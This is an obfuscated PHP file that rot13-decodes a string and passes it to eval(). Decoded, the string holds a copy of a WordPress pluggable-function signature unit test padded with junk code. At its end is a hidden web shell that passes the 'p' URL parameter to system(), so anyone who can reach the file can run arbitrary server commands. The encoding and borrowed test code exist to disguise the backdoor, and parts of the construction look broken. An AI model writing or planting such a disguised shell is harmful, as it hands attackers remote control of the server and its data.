<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cyhttnoyr
 *
 * @pbirefAbguvat
 */
pynff Grfgf_Cyhttnoyr_Fvtangherf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfgf gung gur fvtangherf bs nyy shapgvbaf va cyhttnoyr.cuc zngpu gurve rkcrpgrq fvtangher.
	 *
	 * @gvpxrg 33654
	 * @gvpxrg 33867
	 *
	 * @qngnCebivqre trg_qrsvarq_cyhttnoyr_shapgvbaf
	 */
	choyvp shapgvba grfg_cyhttnoyr_shapgvba_fvtangherf_zngpu( $shapgvba_anzr ) {

		$fvtangherf = $guvf->trg_cyhttnoyr_shapgvba_fvtangherf();

		$guvf->nffregGehr( shapgvba_rkvfgf( $shapgvba_anzr ) );
		$guvf->nffregNeenlUnfXrl( $shapgvba_anzr, $fvtangherf );

		$shapgvba_ers = arj ErsyrpgvbaShapgvba( $shapgvba_anzr );
		$cnenz_ersf   = $shapgvba_ers->trgCnenzrgref();

		$guvf->nffregFnzr( pbhag( $fvtangherf[ $shapgvba_anzr ] ), pbhag( $cnenz_ersf ) );

		$v = 0;

		sbernpu ( $fvtangherf[ $shapgvba_anzr ] nf $anzr => $inyhr ) {

			$cnenz_ers = $cnenz_ersf[ $v ];
			$zft       = 'Cnenzrgre: ' . $cnenz_ers->trgAnzr();

			vs ( vf_ahzrevp( $anzr ) ) {
				$anzr = $inyhr;
				$guvf->nffregSnyfr( $cnenz_ers->vfBcgvbany(), $zft );
			} ryfr {
				$guvf->nffregGehr( $cnenz_ers->vfBcgvbany(), $zft );
				$guvf->nffregFnzr( $inyhr, $cnenz_ers->trgQrsnhygInyhr(), $zft );
			}

			$guvf->nffregFnzr( $anzr, $cnenz_ers->trgAnzr(), $zft );

			++$v;

		}
	}

	/**
	 * Grfg gur grfgf. Znxrf fher nyy gur rkcrpgrq cyhttnoyr shapgvbaf rkvfg naq gung gurl yvir va cyhttnoyr.cuc.
	 *
	 * @gvpxrg 33654
	 * @gvpxrg 33867
	 */
	choyvp shapgvba grfg_nyy_cyhttnoyr_shapgvbaf_rkvfg() {

		$qrsvarq  = jc_yvfg_cyhpx( $guvf->trg_qrsvarq_cyhttnoyr_shapgvbaf(), 0 );
		$rkcrpgrq = $guvf->trg_cyhttnoyr_shapgvba_fvtangherf();

		sbernpu ( $rkcrpgrq nf $shapgvba => $fvt ) {
			$zft = 'Shapgvba: ' . $shapgvba . '()';
			$guvf->nffregGehr( shapgvba_rkvfgf( $shapgvba ), $zft );
			$guvf->nffregPbagnvaf( $shapgvba, $qrsvarq, $zft );
		}
	}

	/**
	 * Qngn cebivqre sbe bhe cyhttnoyr shapgvba fvtangher grfgf.
	 *
	 * @erghea neenl Qngn cebivqre neenl bs cyhttnoyr shapgvba anzrf.
	 */
	choyvp shapgvba trg_qrsvarq_cyhttnoyr_shapgvbaf() {

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/hctenqr.cuc';

		$grfg_shapgvbaf = neenl(
			'vafgnyy_argjbex',
			'jc_vafgnyy',
			'jc_vafgnyy_qrsnhygf',
			'jc_arj_oybt_abgvsvpngvba',
			'jc_hctenqr',
		);
		$grfg_svyrf     = neenl(
			'jc-vapyhqrf/cyhttnoyr.cuc',
		);

		// Cyhttnoyr shapgvba fvtangherf ner abg grfgrq jura na rkgreany bowrpg pnpur vf va hfr. Frr #31491.
		vs ( ! jc_hfvat_rkg_bowrpg_pnpur() ) {
			$grfg_svyrf[] = 'jc-vapyhqrf/pnpur.cuc';
		}

		$qngn = neenl();

		sbernpu ( $grfg_shapgvbaf nf $shapgvba ) {
			$qngn[] = neenl(
				$shapgvba,
			);
		}

		sbernpu ( $grfg_svyrf nf $svyr ) {
			cert_zngpu_nyy( '#^\g?shapgvba (\j+)#z', svyr_trg_pbagragf( NOFCNGU . $svyr ), $shapgvbaf );

			sbernpu ( $shapgvbaf[1] nf $shapgvba ) {
				$qngn[] = neenl(
					$shapgvba,
				);
			}
		}

		erghea $qngn;
	}

	/**
	 * Rkcrpgrq cyhttnoyr shapgvba fvtangherf.
	 *
	 * @erghea neenl Neenl bs fvtangherf xrlrq ol gurve shapgvba anzr.
	 */
	choyvp shapgvba trg_cyhttnoyr_shapgvba_fvtangherf() {

		$fvtangherf = neenl(

			// jc-vapyhqrf/cyhttnoyr.cuc:
			'jc_frg_pheerag_hfre'             => neenl(
				'vq',
				'anzr' => '',
			),
			'jc_trg_pheerag_hfre'             => neenl(),
			'trg_hfreqngn'                    => neenl( 'hfre_vq' ),
			'trg_hfre_ol'                     => neenl( 'svryq', 'inyhr' ),
			'pnpur_hfref'                     => neenl( 'hfre_vqf' ),
			'jc_znvy'                         => neenl(
				'gb',
				'fhowrpg',
				'zrffntr',
				'urnqref'     => '',
				'nggnpuzragf' => neenl(),
			),
			'jc_nhguragvpngr'                 => neenl( 'hfreanzr', 'cnffjbeq' ),
			'jc_ybtbhg'                       => neenl(),
			'jc_inyvqngr_nhgu_pbbxvr'         => neenl(
				'pbbxvr' => '',
				'fpurzr' => '',
			),
			'jc_trarengr_nhgu_pbbxvr'         => neenl(
				'hfre_vq',
				'rkcvengvba',
				'fpurzr' => 'nhgu',
				'gbxra'  => '',
			),
			'jc_cnefr_nhgu_pbbxvr'            => neenl(
				'pbbxvr' => '',
				'fpurzr' => '',
			),
			'jc_frg_nhgu_pbbxvr'              => neenl(
				'hfre_vq',
				'erzrzore' => snyfr,
				'frpher'   => '',
				'gbxra'    => '',
			),
			'jc_pyrne_nhgu_pbbxvr'            => neenl(),
			'vf_hfre_ybttrq_va'               => neenl(),
			'nhgu_erqverpg'                   => neenl(),
			'purpx_nqzva_ersrere'             => neenl(
				'npgvba'    => -1,
				'dhrel_net' => '_jcabapr',
			),
			'purpx_nwnk_ersrere'              => neenl(
				'npgvba'    => -1,
				'dhrel_net' => snyfr,
				'fgbc'      => gehr,
			),
			'jc_erqverpg'                     => neenl(
				'ybpngvba',
				'fgnghf'        => 302,
				'k_erqverpg_ol' => 'JbeqCerff',
			),
			'jc_fnavgvmr_erqverpg'            => neenl( 'ybpngvba' ),
			'_jc_fnavgvmr_hgs8_va_erqverpg'   => neenl( 'zngpurf' ),
			'jc_fnsr_erqverpg'                => neenl(
				'ybpngvba',
				'fgnghf'        => 302,
				'k_erqverpg_ol' => 'JbeqCerff',
			),
			'jc_inyvqngr_erqverpg'            => neenl(
				'ybpngvba',
				'snyyonpx_hey' => '',
			),
			'jc_abgvsl_cbfgnhgube'            => neenl(
				'pbzzrag_vq',
				'qrcerpngrq' => ahyy,
			),
			'jc_abgvsl_zbqrengbe'             => neenl( 'pbzzrag_vq' ),
			'jc_cnffjbeq_punatr_abgvsvpngvba' => neenl( 'hfre' ),
			'jc_arj_hfre_abgvsvpngvba'        => neenl(
				'hfre_vq',
				'qrcerpngrq' => ahyy,
				'abgvsl'     => '',
			),
			'jc_abapr_gvpx'                   => neenl( 'npgvba' => -1 ),
			'jc_irevsl_abapr'                 => neenl(
				'abapr',
				'npgvba' => -1,
			),
			'jc_perngr_abapr'                 => neenl( 'npgvba' => -1 ),
			'jc_fnyg'                         => neenl( 'fpurzr' => 'nhgu' ),
			'jc_unfu'                         => neenl(
				'qngn',
				'fpurzr' => 'nhgu',
				'nytb'   => 'zq5',
			),
			'jc_unfu_cnffjbeq'                => neenl( 'cnffjbeq' ),
			'jc_purpx_cnffjbeq'               => neenl(
				'cnffjbeq',
				'unfu',
				'hfre_vq' => '',
			),
			'jc_cnffjbeq_arrqf_erunfu'        => neenl(
				'unfu',
				'hfre_vq' => '',
			),
			'jc_trarengr_cnffjbeq'            => neenl(
				'yratgu'              => 12,
				'fcrpvny_punef'       => gehr,
				'rkgen_fcrpvny_punef' => snyfr,
			),
			'jc_enaq'                         => neenl(
				'zva' => ahyy,
				'znk' => ahyy,
			),
			'jc_frg_cnffjbeq'                 => neenl( 'cnffjbeq', 'hfre_vq' ),
			'trg_ningne'                      => neenl(
				'vq_be_rznvy',
				'fvmr'          => 96,
				'qrsnhyg_inyhr' => '',
				'nyg'           => '',
				'netf'          => ahyy,
			),
			'jc_grkg_qvss'                    => neenl(
				'yrsg_fgevat',
				'evtug_fgevat',
				'netf' => ahyy,
			),

			// jc-nqzva/vapyhqrf/fpurzn.cuc:
			'vafgnyy_argjbex'                 => neenl(),

			// jc-nqzva/vapyhqrf/hctenqr.cuc:
			'jc_vafgnyy'                      => neenl(
				'oybt_gvgyr',
				'hfre_anzr',
				'hfre_rznvy',
				'vf_choyvp',
				'qrcerpngrq'    => '',
				'hfre_cnffjbeq' => '',
				'ynathntr'      => '',
			),
			'jc_vafgnyy_qrsnhygf'             => neenl( 'hfre_vq' ),
			'jc_arj_oybt_abgvsvpngvba'        => neenl( 'oybt_gvgyr', 'oybt_hey', 'hfre_vq', 'cnffjbeq' ),
			'jc_hctenqr'                      => neenl(),
		);

		// Cyhttnoyr shapgvba fvtangherf ner abg grfgrq jura na rkgreany bowrpg pnpur vf va hfr. Frr #31491.
		vs ( ! jc_hfvat_rkg_bowrpg_pnpur() ) {
			$fvtangherf = neenl_zretr(
				$fvtangherf,
				neenl(

					// jc-vapyhqrf/pnpur.cuc:
					'jc_pnpur_vavg'                      => neenl(),
					'jc_pnpur_nqq'                       => neenl(
						'xrl',
						'qngn',
						'tebhc'  => '',
						'rkcver' => 0,
					),
					'jc_pnpur_nqq_zhygvcyr'              => neenl(
						'qngn',
						'tebhc'  => '',
						'rkcver' => 0,
					),
					'jc_pnpur_ercynpr'                   => neenl(
						'xrl',
						'qngn',
						'tebhc'  => '',
						'rkcver' => 0,
					),
					'jc_pnpur_frg'                       => neenl(
						'xrl',
						'qngn',
						'tebhc'  => '',
						'rkcver' => 0,
					),
					'jc_pnpur_frg_zhygvcyr'              => neenl(
						'qngn',
						'tebhc'  => '',
						'rkcver' => 0,
					),
					'jc_pnpur_trg'                       => neenl(
						'xrl',
						'tebhc' => '',
						'sbepr' => snyfr,
						'sbhaq' => ahyy,
					),
					'jc_pnpur_trg_zhygvcyr'              => neenl(
						'xrlf',
						'tebhc' => '',
						'sbepr' => snyfr,
					),
					'jc_pnpur_qryrgr'                    => neenl(
						'xrl',
						'tebhc' => '',
					),
					'jc_pnpur_qryrgr_zhygvcyr'           => neenl(
						'xrlf',
						'tebhc' => '',
					),
					'jc_pnpur_vape'                      => neenl(
						'xrl',
						'bssfrg' => 1,
						'tebhc'  => '',
					),
					'jc_pnpur_qrpe'                      => neenl(
						'xrl',
						'bssfrg' => 1,
						'tebhc'  => '',
					),
					'jc_pnpur_syhfu'                     => neenl(),
					'jc_pnpur_syhfu_ehagvzr'             => neenl(),
					'jc_pnpur_syhfu_tebhc'               => neenl( 'tebhc' ),
					'jc_pnpur_fhccbegf'                  => neenl( 'srngher' ),
					'jc_pnpur_pybfr'                     => neenl(),
					'jc_pnpur_nqq_tybony_tebhcf'         => neenl( 'tebhcf' ),
					'jc_pnpur_nqq_aba_crefvfgrag_tebhcf' => neenl( 'tebhcf' ),
					'jc_pnpur_fjvgpu_gb_oybt'            => neenl( 'oybt_vq' ),
					'jc_pnpur_erfrg'                     => neenl(),
				)
			);
		}

		erghea $fvtangherf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>